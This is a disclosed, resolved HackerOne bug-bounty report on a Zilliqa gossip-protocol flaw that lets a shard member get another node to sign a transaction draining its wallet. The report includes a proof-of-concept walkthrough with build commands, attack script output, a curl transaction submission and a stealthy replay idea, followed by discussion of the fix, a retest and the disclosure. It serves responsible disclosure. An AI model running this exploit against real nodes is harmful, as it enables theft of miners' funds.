{"id":1058879,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDU4ODc5","url":"https://hackerone.com/reports/1058879","title":"Using gossip to drain miner wallets","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-12-14T22:42:30.419Z","submitted_at":"2020-12-14T22:42:30.483Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ahook","url":"/ahook","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/270/516/931454b97b577c930f46a6b4700371009df43735_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":51016,"url":"https://hackerone.com/zilliqa","handle":"zilliqa","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/vjKBi63N7qgaKwX82bAtRDqL/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/vjKBi63N7qgaKwX82bAtRDqL/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Zilliqa","twitter_handle":"zilliqa","website":"http://zilliqa.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2021-10-04T05:24:25.352Z","bug_reporter_agreed_on_going_public_at":"2021-10-04T05:24:25.234Z","team_member_agreed_on_going_public_at":"2021-09-08T06:53:08.149Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nUsing a flaw in the gossip protocol, a malicious shard member can trick any other fellow shard member into signing an arbitrary message. One way this can be exploited is by creating a transaction transferring funds from the account corresponding to a target node's public key; having the target node sign the transaction data; and then submitting the valid signed transaction to the network, resulting in a loss of funds.\n\n## Details\nMembers of a shard use the gossip protocol to exchange messages. The gossip protocol is a layer that deals only with data messages, leaving any processing to higher protocol layers. Aside from basic size checks, there is no validation on the content of messages that enter the gossip system. Messages are stored in a node and relayed on to others via push/pull requests.\n\nIn order to ensure that gossip messages are coming from an ephemerally trusted source, each message is signed with the sending node's keypair.\n\nGiven these behaviors, an attacker can send any arbitrary message into the system and have it sent back to them signed by the target node. For example, they can send a transaction which drains the funds of the target node's wallet. The target will blindly sign and return the transaction. This signed transaction is then considered valid by the network.\n\nAll the pertinent code lives in the RumorManager, with RumorReceived being the entry point for a gossip message:\nhttps://github.com/Zilliqa/Zilliqa/blob/master/src/libNetwork/RumorManager.cpp\n\n## Steps To Reproduce:\nThe proof of concept consists of three pieces: 1) a patch that should be applied to the v7.0.0 tag in the Zilliqa codebase; 2) a python script to trigger the attack; 3) a sequence of shell commands to setup and run the attack. The attack will be demonstrated on a local testnet.\n\n### attack.patch\nFirst there is a config change in the local testnet constants xml to enable gossip. The rest of the changes are found in the RumorManager.\n\nI've added a new gossip message type ATTACK which the attacker will use to remotely tell their node to run an attack. When the attacker node receives an ATTACK request, it skips the shard-membership checks (the caller will not be a sharded peer). The attack message contains the public key of the target and the public key for the address to transfer the target's funds to. If the target is indeed a fellow shard-member, the attacker node looks up the balance on the account, constructs a transaction to transfer funds to the attacker's address, and sends the transaction data to the target as the payload of a LAZY_PUSH.\n\nLAZY_PUSH expects a mesage hash, but it doesn't verify size, so the transaction itself can be sent (this is a minor side-bug, there should probably be at least a size check on hashes). When sending the malicious LAZY_PUSH, I add the message to the rumor trackers as usual, but with two differences: 1) I use a negative rumor id so that when I receive a response, I can remember it was an attack; 2) I store the message as a hash of itself. This is a kludge: when a PULL comes in we expect a hash of the message, but in our attack the actual data is coming back.\n\nWhen the target receives the LAZY_PUSH, it thinks our transaction data is a hash we're announcing. Since it won't have the message corresponding to such a hash, it will immediately send a PULL back to the attacker to retrieve the unknown message. This PULL message contains the signed transaction.\n\nWhen a PULL is received by the attacker node, I check if the rumor is negative. If so, I extract the signed transaction and log a json formatted version that can be used in a CreateTransaction api call.\n\n### attack.py (contained in attack.patch)\nThis takes two node ids as parameters: the attacker and target. It uses the local testnet directory structure and the getaddr utility to find the public key/address for the attacker and target. it then loops until a balance appears on the target's account. This will take a little time after starting up the network, since a mining epoch must complete and have funds distributed.\n\nOnce a balance is available, it constructs an ATTACK gossip message and sends it to the attacker node (using 127.0.0.1 and the port that the local testnet assigns to the particular node).  It then sleeps for a few seconds to let the attack finish.\n\nFinally it opens the logs for the attacker node and pulls out the transaction json the attacker node received from the target. This json can then be used in a CreateTransaction rpc, as seen in the shell session below.\n\n### shell session\nThis is the complete session I used on a fresh Ubuntu 20.04 instance on ec2:\n```\n$ # install dependencies and setup the codebase\n$ sudo apt-get update\n$ sudo apt-get install -y git libboost-system-dev libboost-filesystem-dev libboost-test-dev libssl-dev libleveldb-dev libjsoncpp-dev libsnappy-dev cmake libmicrohttpd-dev libjsonrpccpp-dev build-essential pkg-config libevent-dev libminiupnpc-dev libcurl4-openssl-dev libboost-program-options-dev libboost-python-dev python3-dev python3-setuptools python3-pip gawk python\n$ git clone https://github.com/Zilliqa/Zilliqa.git\n$ cd Zilliqa\n$ git checkout v7.0.0\n$\n$ # copy attack.patch to the base directory in Zilliqa, apply the patch, and build\n$ git apply attack.patch\n$ ./build.sh\n$\n$ # launch the local testnet\n$ cd build\n$ ./tests/Node/pre_run.sh \u0026\u0026 ./tests/Node/test_node_lookup.sh \u0026\u0026 ./tests/Node/test_node_simple.sh\n$ cd ../\n$\n$ # launch the attack, node 1 will attack node 2 (output included)\n$ python3 ./attack.py 1 2\nAttacker:\n  PubKey: 023649F0534998ED3783BD0C423D82CEA86818198884A4961F697B055DBDF27339\n  Addr  : 8f5978067d4f6489a7068b0f0528e504fe848474\nTarget:\n  PubKey: 025EFE9A8FF149CEF1EB7A86439A1972FDB52E9C078BA919E87FE3F42BC8A06F87\n  Addr  : dd7a7bd4636e38d339f90338b38d862c4a476a25\nChecking for balance on target address...\nTarget balance: 13357142857142856\nAttack balance: 15321428571428586\nConnecting to attacker...\nCreating ATTACK message...\nSending ATTACK message...\nSleeping for a few seconds to let the attack run\nLooking for transaction in the attacker node logs...\n[WARN][120467][20-12-14T22:12:48.040][RumorManager.cpp:530][RumorReceived       ] Received signed txn from ATTACK: {\"version\": 65537,\"nonce\": 1,\"toAddr\": \"8F5978067D4F6489A7068b0F0528e504fe848474\",\"amount\": \"13357140857142856\",\"pubKey\": \"025EFE9A8FF149CEF1EB7A86439A1972FDB52E9C078BA919E87FE3F42BC8A06F87\",\"gasPrice\": \"2000000000\",\"gasLimit\": \"1\",\"code\": \"\",\"data\": \"\",\"signature\": \"0CF96985752F0507343E8E99D65F2D6F1D14749211495D488FF0B51AC80E0C40AA2F92FA657D9304B385E1F89ACC00626B27719C5A1EED17E80B6123A4C81CB5\",\"priority\": false}\n$\n$ # now submit this transaction to the network\n$ curl -s -d '{\"id\": \"1\", \"jsonrpc\": \"2.0\", \"method\": \"CreateTransaction\", \"params\": [{\"version\": 65537,\"nonce\": 1,\"toAddr\": \"8F5978067D4F6489A7068b0F0528e504fe848474\",\"amount\": \"13357140857142856\",\"pubKey\": \"025EFE9A8FF149CEF1EB7A86439A1972FDB52E9C078BA919E87FE3F42BC8A06F87\",\"gasPrice\": \"2000000000\",\"gasLimit\": \"1\",\"code\": \"\",\"data\": \"\",\"signature\": \"0CF96985752F0507343E8E99D65F2D6F1D14749211495D488FF0B51AC80E0C40AA2F92FA657D9304B385E1F89ACC00626B27719C5A1EED17E80B6123A4C81CB5\",\"priority\": false}] }' -X POST http://127.0.0.1:4201/\n{\"id\":\"1\",\"jsonrpc\":\"2.0\",\"result\":{\"Info\":\"Non-contract txn, sent to shard\",\"TranID\":\"c54bf9201065a981310b5d176c4e88c81c7298da72c98b6616efc54a08dac21a\"}}\n$\n$ # wait a little bit and check on the transaction\n$ curl -s -d '{\"id\": \"1\",\"jsonrpc\": \"2.0\",\"method\": \"GetTransaction\",\"params\": [\"c54bf9201065a981310b5d176c4e88c81c7298da72c98b6616efc54a08dac21a\"]}' -H \"Content-Type: application/json\" -X POST http://127.0.0.1:4201/ | python -m json.tool\n{\n    \"id\": \"1\",\n    \"jsonrpc\": \"2.0\",\n    \"result\": {\n        \"ID\": \"c54bf9201065a981310b5d176c4e88c81c7298da72c98b6616efc54a08dac21a\",\n        \"amount\": \"13357140857142856\",\n        \"gasLimit\": \"1\",\n        \"gasPrice\": \"2000000000\",\n        \"nonce\": \"1\",\n        \"receipt\": {\n            \"cumulative_gas\": \"1\",\n            \"epoch_num\": \"35\",\n            \"success\": true\n        },\n        \"senderPubKey\": \"0x025EFE9A8FF149CEF1EB7A86439A1972FDB52E9C078BA919E87FE3F42BC8A06F87\",\n        \"signature\": \"0x0CF96985752F0507343E8E99D65F2D6F1D14749211495D488FF0B51AC80E0C40AA2F92FA657D9304B385E1F89ACC00626B27719C5A1EED17E80B6123A4C81CB5\",\n        \"toAddr\": \"8f5978067d4f6489a7068b0f0528e504fe848474\",\n        \"version\": \"65537\"\n    }\n}\n```\n\n## Impact\n\nI'd consider the impact on this to be a step above a standard critical. An attacker, once PoW'd into a shard, can drain all wallets associated with that shard. Further, since transactions contain no record of time/history beyond a sequential nonce, the attacker could run this in multiple phases: 1) collect signed transactions from miners over a period of time, having them sign for multiple future nonces; 2) wait a little bit until any evidence of invalid messages in the logs, etc have rolled into oblivion; 3) start submitting the saved transactions to the network.\n\nI believe this would be extremely hard to debug, as there wold be no new evidence of the attack method once the transactions are played.","bounty_amount":"10000.0","formatted_bounty":"$10,000","weakness":{"id":124,"name":"Improper Authorization"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":72,"voters":["th3hidd3nmist","n1m0","run_win","parsiya","zonduu","nikitastupin","bombon","alp","xsky","ayoub0x1","and 62 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":59101,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/Zilliqa/Zilliqa","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10110827,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ahook,\n\nThank you for your submission. I hope you are well in these tough times of the pandemic. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nHave a great day! \n\nKind regards,\n@ktistai","automated_response":false,"created_at":"2020-12-15T12:47:32.921Z","updated_at":"2020-12-15T12:47:32.921Z","actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10117035,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"A couple ideas for mitigation:\n\n1) Do at least some minimal validation upstream before accepting a message into the gossip system. Possibly delaying acceptance until processing is complete, then using a callback of some sort to accept/reject accordingly.\n\n2) Could prepend a random 256-bit nonce to messages and sign that instead of the raw message. This would increase the size of gossip messages but would ensure nodes aren't signing anything that would be considered meaningful elsewhere.\n\nAnd then also rolling out a fix to this will need to be pretty well thought out. If anyone sees the patch and realizes the implications, they could collect transactions before it's fully deployed. Further, it might be necessary to urge miners to switch to new addresses on the off chance someone found this already and is sitting on signed transactions for current miners.","automated_response":false,"created_at":"2020-12-16T02:24:43.952Z","updated_at":"2020-12-16T02:29:59.699Z","actor":{"username":"ahook","cleared":true,"url":"/ahook","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/270/516/931454b97b577c930f46a6b4700371009df43735_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10117698,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Actually, the more I think on it, the best mitigation might be to pass gossip messages around with the original signature. This would eliminate the need to re-sign on each send. Only the originator of the message needs to sign it, and all shards will accept the signature. Also has the plus that it could be snuck in as a performance fix to cut out unnecessary signing operations.","automated_response":false,"created_at":"2020-12-16T06:08:35.912Z","updated_at":"2020-12-16T06:08:35.912Z","actor":{"username":"ahook","cleared":true,"url":"/ahook","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/270/516/931454b97b577c930f46a6b4700371009df43735_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10117885,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi. Thank you for your finding and follow-ups. It is indeed a very good catch and we are in the midst of completing the triaging and determine the resolution. \n\nOn the resolution, we are thinking to append the blockchain ID eg. 1 for mainnet and 333 for testnet, This also allows us to reject any non-malicious message that was accidentally sent from one chain eg. testnet to another chain eg. mainnet. We should be also adding an additional check for length to ensure it matches the hash length. \n\nWe are still thinking about having the originator's signature. It is tricky on that end, as the message may not be from its own shard. \n\nWe will award the bounty once we complete the triaging. \n\n","automated_response":false,"created_at":"2020-12-16T06:46:43.689Z","updated_at":"2020-12-16T06:46:43.689Z","actor":{"username":"junhaotan","cleared":false,"url":"/junhaotan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10160628,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","automated_response":false,"created_at":"2020-12-21T05:37:18.440Z","updated_at":"2020-12-21T05:37:18.440Z","additional_data":{"added_weaknesses":[{"id":124,"name":"Improper Authorization"}],"removed_weaknesses":[{"id":75,"name":"Privilege Escalation"}]},"actor":{"username":"junhaotan","cleared":false,"url":"/junhaotan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10160633,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-12-21T05:39:40.465Z","updated_at":"2020-12-21T05:39:40.465Z","actor":{"username":"junhaotan","cleared":false,"url":"/junhaotan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10160639,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your report, We will proceed with the fix in 2 upgrade cycles\nv7 - hotfix by adding hash length check\nv7.1 - proper fix for the signing","automated_response":false,"created_at":"2020-12-21T05:40:48.693Z","updated_at":"2020-12-21T05:40:48.693Z","actor":{"username":"junhaotan","cleared":false,"url":"/junhaotan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10160644,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thank you for identifying this critical bug and making Zilliqa platform safer for everyone","automated_response":false,"created_at":"2020-12-21T05:41:58.647Z","updated_at":"2020-12-21T05:41:58.647Z","actor":{"url":"/zilliqa","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/vjKBi63N7qgaKwX82bAtRDqL/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Zilliqa"}},"bounty_amount":"10000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"zilliqa","collaborator":{"username":"ahook","url":"/ahook"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10169508,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks!!\n\nQuick note, you probably already realize this, but the hash len fix doesn't really do anything to mitigate. The attacker just has to use a LAZY_PUSH with the txn hash, the target responds with a PULL for the txn, the attacker sends the txn, and then the attacker does a PULL to get the signed txn back. The unchecked length bug was just a shortcut to reduce message round-trips.\n\nI'l keep an eye out for the second patch. Feel free to post it here if you want another set of eyes on it.","automated_response":false,"created_at":"2020-12-21T19:38:07.745Z","updated_at":"2020-12-21T19:38:07.745Z","actor":{"username":"ahook","cleared":true,"url":"/ahook","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/270/516/931454b97b577c930f46a6b4700371009df43735_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11036489,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just checking in, was this ever resolved?","automated_response":false,"created_at":"2021-03-17T22:47:57.327Z","updated_at":"2021-03-17T22:47:57.327Z","actor":{"username":"ahook","cleared":true,"url":"/ahook","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/270/516/931454b97b577c930f46a6b4700371009df43735_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11047905,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ahook \n\nThanks for checking in. We have discretely added the fix in one of the PR and is scheduled for release in mid-April mandatory upgrade. Once all nodes have updated, we can then provide more information on the fix publicly. \nhttps://github.com/Zilliqa/Zilliqa/pull/2459/files\n\nThe fix was to add another piece of information i.e Chain ID on top of the original message before signing. ","automated_response":false,"created_at":"2021-03-19T03:28:00.665Z","updated_at":"2021-03-19T03:28:00.665Z","actor":{"username":"junhaotan","cleared":false,"url":"/junhaotan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11084536,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great, thanks!  This looks like it should work.\n\nOne thing to keep in mind: if there's a message an attacker wants to have signed which happens to begin with 0x0001 (mainnet CHAIN_ID), then they could still get a valid signature by sending the message with the first two bytes removed. I don't think this is currently an issue since transactions appear to be serialized protobufs. But if for some reason that was changed to something like RLP, which would encode the txn's version field as a uint16, there could be trouble again.","automated_response":false,"created_at":"2021-03-22T23:04:03.291Z","updated_at":"2021-03-22T23:04:03.291Z","actor":{"username":"ahook","cleared":true,"url":"/ahook","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/270/516/931454b97b577c930f46a6b4700371009df43735_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11701788,"is_internal":false,"editable":false,"type":"Activities::BugRetesting","message":"Hi @ahook \n\nI am happy to inform you that the proposed fix has been rolled out to Zilliqa mainnet v8. The fix was in the previously mentioned PR. \nI have added a retreat bounty for you to revisit this issue again to check that it is fully fixed. \n\nThanks for making Zilliqa safer \n\n\n\n\n","automated_response":false,"created_at":"2021-05-11T14:06:32.179Z","updated_at":"2021-05-11T14:06:32.422Z","actor":{"username":"junhaotan","cleared":false,"url":"/junhaotan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","report_retest":{"id":5535,"retest_subscription":{"handled_by_triage":false}},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11719982,"is_internal":false,"editable":false,"type":"Activities::RetestUserExpired","message":"","automated_response":false,"created_at":"2021-05-12T14:55:08.098Z","updated_at":"2021-05-12T14:55:08.098Z","actor":{"username":"ahook","cleared":true,"url":"/ahook","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/270/516/931454b97b577c930f46a6b4700371009df43735_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11720160,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2021-05-12T15:08:06.153Z","updated_at":"2021-05-12T15:08:06.153Z","additional_data":{"report_retest_user_id":11627},"actor":{"username":"norwegianwood","cleared":true,"url":"/norwegianwood","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11720205,"is_internal":false,"editable":false,"type":"Activities::UserCompletedRetest","message":"Followed the PoC, unable to reproduce the behavior.","automated_response":false,"created_at":"2021-05-12T15:11:20.373Z","updated_at":"2021-05-12T15:11:20.373Z","actor":{"username":"norwegianwood","cleared":true,"url":"/norwegianwood","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11739456,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry, missed that retesting deadline. Looks like someone already retested the PoC. I haven't retested but have reviewed the patch and it looks good to me.","automated_response":false,"created_at":"2021-05-13T20:32:41.520Z","updated_at":"2021-05-13T20:32:41.520Z","actor":{"username":"ahook","cleared":true,"url":"/ahook","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/270/516/931454b97b577c930f46a6b4700371009df43735_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11764277,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"`Are you able to reproduce the vulnerability report?`\nOops, I meant to say it is not reproducible anymore.","automated_response":false,"created_at":"2021-05-16T09:55:57.968Z","updated_at":"2021-05-16T09:55:57.968Z","actor":{"username":"norwegianwood","cleared":true,"url":"/norwegianwood","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11813574,"is_internal":false,"editable":false,"type":"Activities::ReportRetestApproved","message":"Thanks for the re-test","automated_response":false,"created_at":"2021-05-20T03:11:44.976Z","updated_at":"2021-05-20T03:11:44.976Z","actor":{"url":"/zilliqa","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/vjKBi63N7qgaKwX82bAtRDqL/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Zilliqa"}},"genius_execution_id":null,"team_handle":"zilliqa","report_retest_user":{"user":{"username":"norwegianwood"},"report_retest":{"retest_subscription":{"tag":"hacker_powered_h1b_h1c","handled_by_triage":false,"awarding_retesters":true}}},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11813575,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Revert report state to triaged from retesting","automated_response":false,"created_at":"2021-05-20T03:11:45.106Z","updated_at":"2021-05-20T03:11:45.106Z","actor":{"username":"junhaotan","cleared":false,"url":"/junhaotan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11813578,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2021-05-20T03:12:43.129Z","updated_at":"2021-05-20T03:12:43.129Z","actor":{"username":"junhaotan","cleared":false,"url":"/junhaotan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"ahook","url":"/ahook"},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12160321,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any chance we can mark this for public disclosure? Or alternately, do y'all plan to disclose in a security update or anything?","automated_response":false,"created_at":"2021-06-17T20:23:26.044Z","updated_at":"2021-06-17T20:23:26.044Z","actor":{"username":"ahook","cleared":true,"url":"/ahook","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/270/516/931454b97b577c930f46a6b4700371009df43735_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12349892,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ho @ahook \n\nYes. We are open to public disclosure. However, this program is still in private mode. I plan to make it go public soon. Once it is public, we can mark this for public disclosure ","automated_response":false,"created_at":"2021-07-05T03:54:15.849Z","updated_at":"2021-07-05T03:54:15.849Z","actor":{"username":"junhaotan","cleared":false,"url":"/junhaotan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12350102,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"dope, thanks!","automated_response":false,"created_at":"2021-07-05T04:34:10.403Z","updated_at":"2021-07-05T04:34:10.403Z","actor":{"username":"ahook","cleared":true,"url":"/ahook","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/270/516/931454b97b577c930f46a6b4700371009df43735_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":13360387,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"hi @ahook I am glad to inform you that the program is now in public mode. I will be initiating a public disclosure for this report in the coming days","automated_response":false,"created_at":"2021-09-08T06:48:12.087Z","updated_at":"2021-09-08T06:48:12.087Z","actor":{"username":"junhaotan","cleared":false,"url":"/junhaotan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":13360771,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-09-08T06:53:08.192Z","updated_at":"2021-09-08T06:53:08.192Z","first_to_agree":true,"actor":{"username":"junhaotan","cleared":false,"url":"/junhaotan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":13734202,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-10-04T05:24:25.272Z","updated_at":"2021-10-04T05:24:25.272Z","actor":{"username":"ahook","cleared":true,"url":"/ahook","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/270/516/931454b97b577c930f46a6b4700371009df43735_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":13734203,"is_internal"